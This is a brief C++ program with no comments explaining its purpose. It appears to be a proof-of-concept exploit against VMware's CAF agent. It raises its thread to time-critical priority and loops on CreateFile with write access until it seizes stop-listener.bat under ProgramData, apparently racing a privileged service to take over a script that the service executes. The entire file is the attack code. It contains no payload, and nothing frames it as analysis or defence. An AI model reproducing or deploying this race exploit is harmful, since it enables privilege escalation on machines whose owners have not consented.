#include "stdafx.h"

int main()
{
	
	HANDLE thisthread = GetCurrentThread();
	SetThreadPriority(thisthread, THREAD_PRIORITY_TIME_CRITICAL);
	HANDLE testhandle = NULL;
	do {
		CloseHandle(testhandle);
		testhandle = CreateFile(L"C:\\ProgramData\\VMware\\VMware CAF\\pme\\scripts\\stop-listener.bat", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);                 // no attr. template)
	} while (testhandle == INVALID_HANDLE_VALUE);
	CloseHandle(testhandle);


	
	return 0;
}

